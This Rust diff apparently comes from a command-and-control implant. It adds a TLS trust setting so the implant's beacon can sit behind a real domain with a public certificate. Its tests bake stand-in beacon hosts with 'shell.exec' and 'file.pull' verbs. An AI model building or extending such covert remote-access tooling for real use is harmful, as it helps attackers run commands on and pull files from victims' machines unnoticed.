@@ -15,6 +15,11 @@ pub struct Profile {
     pub beacon_url: String,
     pub fallback_enroll_urls: Vec<String>,
     pub ca_pem: String,
+    /// The TLS trust posture: "pinned" (the default -- the CA above is the
+    /// only root the dials trust) or "public" (a real-domain front whose
+    /// certificate a public CA issued; the dials validate like an ordinary
+    /// client against the compiled-in Mozilla root set).
+    pub tls_trust: String,
     pub kill_date: Option<String>,
     pub sleep_seconds: f64,
     pub jitter_seconds: f64,
@@ -66,6 +71,7 @@ impl Profile {
                 })
                 .unwrap_or_default(),
             ca_pem: field(&map, "caCert").unwrap_or("").to_string(),
+            tls_trust: field(&map, "tlsTrust").unwrap_or("pinned").to_string(),
             kill_date: match field(&map, "killDate") {
                 Some(text) if !text.is_empty() => Some(text.to_string()),
                 _ => None,
@@ -106,6 +112,7 @@ impl Profile {
             beacon_url: strip_trailing_path(&std::env::var("ROD_BEACON_URL").unwrap_or_default()),
             fallback_enroll_urls: fallbacks,
             ca_pem: std::env::var("ROD_CA_CERT").unwrap_or_default(),
+            tls_trust: std::env::var("ROD_TLS_TRUST").unwrap_or_else(|_| "pinned".into()),
             kill_date: std::env::var("ROD_KILL_DATE")
                 .ok()
                 .filter(|s| !s.is_empty()),
@@ -143,6 +150,12 @@ impl Profile {
             .and_then(parse_iso_to_unix)
             .map(|kill| unix_now() > kill)
             .unwrap_or(false)
+    }
+
+    /// Whether the TLS dials ride the public-trust posture (the real-domain
+    /// front): true only when the bake explicitly named it.
+    pub fn public_tls(&self) -> bool {
+        self.tls_trust.eq_ignore_ascii_case("public")
     }
 
     /// The egress walk: the primary enroll URL then the fallbacks, all with
@@ -263,6 +276,7 @@ mod tests {
             beacon_url: String::new(),
             fallback_enroll_urls: Vec::new(),
             ca_pem: String::new(),
+            tls_trust: "pinned".into(),
             kill_date: None,
             sleep_seconds: 30.0,
             jitter_seconds: 10.0,
@@ -280,10 +294,14 @@ mod tests {
     #[test]
     fn the_full_bake_reads_every_contract_key() {
         let baked = bake(
-            r#"{"enrollURL":"https://front.example/old","beaconURL":"https://beacon.example/contact","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
+            r#"{"enrollURL":"https://front.example/old","beaconURL":"https://beacon.example/contact","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
         );
         let profile = Profile::from_baked(&baked).expect("the bake parses");
         assert_eq!(profile.enroll_url, "https://front.example/old");
+        // The public-trust posture is an explicit bake: the real-domain
+        // front whose publicly-trusted chain the dials validate.
+        assert_eq!(profile.tls_trust, "public");
+        assert!(profile.public_tls());
         // The contact front keeps scheme and authority only: the route is
         // the server's, not the bake's.
         assert_eq!(profile.beacon_url, "https://beacon.example");
@@ -318,6 +336,10 @@ mod tests {
         assert_eq!(profile.kill_date, None);
         assert_eq!(profile.beacon_url, "");
         assert!(profile.fallback_enroll_urls.is_empty());
+        // The trust posture defaults to pinned -- a bake names public only
+        // when the front is a real domain with a public certificate.
+        assert_eq!(profile.tls_trust, "pinned");
+        assert!(!profile.public_tls());
     }
 
     #[test]
